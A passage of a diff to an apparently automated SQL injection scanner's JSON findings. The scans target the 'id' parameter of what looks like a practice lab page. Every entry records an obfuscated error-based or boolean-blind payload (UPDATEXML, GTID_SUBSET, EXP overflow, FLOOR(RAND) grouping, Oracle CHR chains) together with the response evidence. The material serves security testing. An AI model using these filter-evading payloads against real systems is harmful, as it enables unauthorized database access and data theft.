+        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/1=('S'/**/+/**/'V'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'||(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)||'V'/**/+/**/'A'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A')/**/)||'",
         "type": "SQLi-error_based",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0773,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.077,
-        "analysis_details": [
-          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0778,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/(sElEcT/**/1/**/uNiOn/**/sElEcT/**/2)/**/END))/**/)||'",
-        "type": "SQLi-boolean_blind",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0177,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'+(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/oR/**/NOT/**/1=1/**/)+'",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0146,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/)+'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0119,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/CHR(118)||CHR(117)||CHR(110)/**/WHERE/**/1=1/**/aNd/**/1=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)))/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.1365,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/CHR(118)||CHR(117)||CHR(110)/**/WHERE/**/1=1/**/aNd/**/1=UTL_INADDR.GET_HOST_ADDRESS(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65))/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.1366,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/(sElEcT/**/2*(IF((sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))s),/**/8446744073709551610,/**/8446744073709551610)))/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0777,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=CONCAT(0x5356534441414141,(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)),0x5641534441414141)/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0386,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=('S'/**/+/**/'V'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'||(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)||'V'/**/+/**/'A'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A')/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0541,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0526,
+        "response_time": 0.0246,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -2815,7 +2479,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0769,
+        "response_time": 0.0253,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -2831,175 +2495,60 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=1/**/)||'",
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/(sElEcT/**/2*(IF((sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))s),/**/8446744073709551610,/**/8446744073709551610)))/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0289,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=('S'/**/+/**/'V'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'||(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)||'V'/**/+/**/'A'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A')/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0202,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/(sElEcT/**/1/**/uNiOn/**/sElEcT/**/2)/**/END))/**/)||'",
         "type": "SQLi-boolean_blind",
         "severity": "Low",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.054,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/(sElEcT/**/1/**/FROM(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/INFoRMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0529,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/1=CONCAT(0x5356534441414141,(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)),0x5641534441414141)/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0765,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/1=('S'/**/+/**/'V'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'||(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)||'V'/**/+/**/'A'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A')/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0526,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/1/**/IN/**/(sElEcT/**/(0x5356534441414141+(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END))+0x5641534441414141))/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0768,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/NOT/**/1=1/**/)||'",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0774,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0773,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/aNd/**/1=(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/(sElEcT/**/1/**/uNiOn/**/sElEcT/**/2)/**/END))/**/)||'",
-        "type": "SQLi-boolean_blind",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0517,
+        "response_time": 0.0121,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -3022,7 +2571,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0308,
+        "response_time": 0.0134,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -3038,14 +2587,169 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/aNd/**/1=('S'/**/+/**/'V'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'||(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)||'V'/**/+/**/'A'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A')/**/)||'",
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0562,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
         "type": "SQLi-error_based",
         "severity": "Low",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0771,
+        "response_time": 0.0569,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/CHR(118)||CHR(117)||CHR(110)/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)))/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0574,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0563,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0571,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0563,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/oR/**/NOT/**/1=1/**/)+'",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0313,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/NOT/**/1=1/**/)||'",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0563,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -3068,7 +2772,257 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0189,
+        "response_time": 0.021,
+        "analysis_details": [
+          "[Boolean] Content length changed by 4471 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0565,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=CONCAT(0x5356534441414141,(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)),0x5641534441414141)/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0577,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/(sElEcT/**/2*(IF((sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))s),/**/8446744073709551610,/**/8446744073709551610)))/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.024,
+        "analysis_details": [
+          "[Boolean] Content length changed by 4432 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/)+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0412,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/(sElEcT/**/1/**/FROM(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/INFoRMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)/**/)||'",
